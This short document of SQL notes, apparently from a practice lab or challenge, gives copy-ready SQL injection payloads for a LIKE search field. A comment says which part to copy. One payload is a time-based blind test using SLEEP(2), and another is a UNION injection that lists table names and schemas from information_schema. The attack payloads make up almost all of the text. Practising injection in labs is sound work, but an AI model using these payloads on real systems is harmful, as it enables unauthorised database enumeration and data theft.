--copy from directly after the first % to the end of the line, including the space after --
SELECT ? FROM ? WHERE ? LIKE '%item%'; --example

SELECT ? FROM ? WHERE ? LIKE '%hammer' AND 0 = SLEEP(2);-- 

SELECT ? FROM ? WHERE ? LIKE '%hammer' UNION (SELECT TABLE_NAME, TABLE_SCHEMA, 3, 4 FROM information_schema.tables);--  